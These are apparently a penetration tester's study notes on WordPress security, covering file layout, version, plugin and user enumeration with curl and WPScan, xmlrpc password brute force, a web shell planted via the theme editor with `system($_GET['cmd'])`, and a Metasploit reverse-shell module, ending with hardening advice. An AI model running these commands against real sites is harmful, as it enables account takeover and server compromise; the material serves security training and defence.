---
title: Notes | Wordpress
author: Zeropio
date: 2022-08-03
categories: [Notes, Web]
tags: [wordpress]
permalink: /notes/web/wordpress
---

**WordPress** is the most popular open source **Content Management System** (**CMS**), powering nearly one-third of all websites in the world. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. A CMS is a powerful tool that helps build a website without the need to code everything from scratch. A CMS is made up of two key components:
- A **Content Management Application** (**CMA**) - the interface used to add and manage content. 
- A **Content Delivery Application** (**CDA**) - the backend that takes the input entered into the CMA and assembles the code into a working, visually appealing website.

After installation, all WordPress supporting files and directories will be accessible in the webroot located at /var/www/html:
```console
zero@pio$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

The root directory of WordPress contains files that are needed to configure WordPress to function correctly:
- `index.php`{: .filepath}: homepage
- `license.txt`{: .filepath}: contains useful information such as the version WordPress installed
- `wp-activatr.php`{: .filepath}: is used for the email activation process when setting up a new WordPress site
- `wp-admin`{: .filepath}: folder contains the login page for administrator access and the backend dashboard, the login page can be located at one of the following paths:
  - `/wp-admin/login.php`{: .filepath}
  - `/wp-admin/wp-login.php`{: .filepath}
  - `/login.php`{: .filepath}
  - `/wp-login.php`{: .filepath}
- `xmlrpc.php`{: .filepath}: is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism, this type of communication has been replaced by the WordPress REST API 
- `wp-config.php`{: .filepath}: contains information required by WordPress to connect to the database, such as the database name, database host, username and password, authentication keys and salts, and the database table prefix
- `wp-content`{: .filepath}: is the main directory where plugins and themes are stored, the subdirectory `uploads/`{: .filepath} is usually where any files uploaded to the platform are stored
- `wp-includes`{: .filepath}: is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets 

There are five types of users in a standard WordPress installation:

| **Role**   | **Description**    |
|--------------- | --------------- |
| Administrator | This user has access to administrative features within the website |
| Editor | An editor can publish and manage posts, including the posts of other users |
| Author | Authors can publish and manage their own posts |
| Contributor | These users can write and manage their own posts but cannot publish them |
| Subscriber | These are normal users who can browse posts and edit their profiles |

Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.

---

# Enumeration 

## WordPress Core Version 

It is always important to know what type of application we are working with. An essential part of the enumeration phase is uncovering the software version number. The first and easiest step is reviewing the page source code. We can do this by right-clicking anywhere on the current page and selecting *View page source* from the menu or using the keyboard shortcut `CTRL + u`. We can search for the meta generator tag using the shortcut `CTRL + F` in the browser or use cURL along with grep from the command line to filter for this information.

```html
...
<link rel='https://api.w.org/' href='http://blog.inlanefreight.com/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.3.3" />
...
```

```console
zero@pio$ curl -s -X GET http://<TARGET> | grep '<meta name="generator"'

<meta name="generator" content="WordPress 5.3.3" />
```

Aside from version information, the source code may also contain comments that may be useful:

- CSS version 

```html
...
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
...
```

- JS version 

```html
...
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'></script>
...
```

In older WordPress versions, another source for uncovering version information is the `readme.html`{: .filepath} file in WordPress's root directory.

## Plugins and Themes 

e can also find information about the installed plugins by reviewing the source code manually by inspecting the page source or filtering for the information using cURL and other command-line utilities: 

- Plugins 

```console
zero@pio$ curl -s -X GET http://<TARGET> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

> Check also `http://<TARGET>/?p=1`
{: .prompt-tip}

- Themes 

```console
zero@pio$ curl -s -X GET http://<TARGET> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

The response headers may also contain version numbers for specific plugins. However, not all installed plugins and themes can be discovered passively. In this case, we have to send requests to the server actively to enumerate them. We can do this by sending a GET request that points to a directory or file that may exist on the server:
```console
zero@pio$ curl -I -X GET http://<TARGET>/wp-content/plugins/mail-masta
```

## Directory Indexing 

Active plugins should not be our only area of focus when assessing a WordPress website. Even if a plugin is deactivated, it may still be accessible, and therefore we can gain access to its associated scripts and functions. Deactivating a vulnerable plugin does not improve the WordPress site's security. It is best practice to either remove or keep up-to-date any unused plugins.

We can also view the directory listing using cURL:
```console
zero@pio$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
```

This type of access is called **Directory Indexing**. It allows us to navigate the folder and access files that may contain sensitive information or vulnerable code.

## User 

Enumerating a list of valid users is a critical phase of a WordPress security assessment. Armed with this list, we may be able to guess default credentials or perform a brute force password attack.

The first method is reviewing posts to uncover the ID assigned to the user and their corresponding username. The **admin** user is usually assigned the user **ID 1**. We can confirm this by specifying the user ID for the author parameter in the URL: `http://<TARGET>/?author=1`. If the user does not exist, we receive a **404 Not Found error**. 

The second method requires interaction with the JSON endpoint, which allows us to obtain a list of users. This was changed in WordPress core after version 4.7.1, and later versions only show whether a user is configured or not:
```console
zero@pio$ curl http://<TARGET>/wp-json/wp/v2/users | jq
```

We can use wpscan:
```console
zero@pio$ wpscan –-url http://<TARGET> –-enumerate u
```

## Login 

Once we are armed with a list of valid users, we can mount a password brute-forcing attack to attempt to gain access to the WordPress backend. This attack can be performed via the login page or the `xmlrpc.php`{: .filepath} page. If our POST request against `xmlrpc.php`{: .filepath} contains valid credentials, we will receive the following output:
```console
zero@pio$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://<TARGET>/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  ...
```

If the credentials are not valid, we will receive a **403 faultCode error**. We can enumerate the aviable methods replacing `wp.getUsersBlogs` by `system.listMethods`.

We can try bruteforcing with wpscan:
```console
zero@pio$ sudo wpscan --password-attack xmlrpc -t 20 -U <USER> -P <WORDLIST> --url http://<TARGET>
```

Also, the `use exploit/unix/webapp/wp_admin_shell_upload` module from Metasploit could help us.

## WPScan 

WPScan is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable.

---

# Exploitation

## Exploiting a Vulnerable Plugin 

### Leveraging WPScan Results 

With the report from WPScan we can try to use the vulnerabilities found. Each vulnerability has his way to exploit, some of them can be easily find, others can haven't a public POO.

## Attacking WordPress Users 

### WordPress User Bruteforce 

WPScan can be used to brute force usernames and passwords. The tool uses two kinds of login brute force attacks, **xmlrpc** and **wp-login**. The **wp-login** method will attempt to brute force the normal WordPress login page, while the **xmlrpc** method uses the WordPress API to make login attempts through `/xmlrpc.php`{: .filepath}. The **xmlrpc** method is preferred as it is faster. We can do with the following command:
```console
zero@pio$ wpscan --password-attack xmlrpc -t 20 -U <USER> -P <WORDLIST> --url http://<TARGET>
```

## RCE via the Theme Editor

### Attacking the WordPress Backend 

With administrative access to WordPress, we can modify the PHP source code to execute system commands. Click on **Appearance** on the side panel and select **Theme Editor**. This page will allow us to edit the PHP source code directly. For example, adding `system($_GET['cmd']);` to a page like `404.php`:
```console
zero@pio$ curl -X GET "http://<TARGET>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```

## Attacking WordPress with Metasploit 

### Automating WordPress Exploitation 

We can use the **Metasploit Framework** (**MSF**) to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver:
```console
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts <TARGET>
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username <USER> 
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password <PASSWORD>
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost <IP>
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run
```

---

# WordPress Hardening 

## Perform Regular Updates 

We can even modify the `wp-config.php`{: .filepath} file to enable automatic updates by inserting the following lines:
```php
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```

## Plugin and Theme Management 

Only install trusted themes and plugins from the WordPress.org website. Before installing a plugin or theme, check its reviews, popularity, number of installs, and last update date.

## Enhance WordPress Security 

Several WordPress security plugins can be used to enhance the website's security.
- **Sucuri Security**
- **iThemes Security**
- **Wordfence Security**

## User Management 

The following user-related best practices will help improve the overall security of a WordPress site:
- Disable the standard admin user and create accounts with difficult to guess usernames
- Enforce strong passwords
- Enable and enforce two-factor authentication (2FA) for all users
- Restrict users' access based on the concept of least privilege
- Periodically audit user rights and access. Remove any unused accounts or revoke access that is no longer needed

## Configuration Management 

Certain configuration changes can increase the overall security posture of a WordPress installation:
- Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack
- Limit login attempts to prevent password brute-forcing attacks
- Rename the `wp-admin.php`{: .filepath} login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses

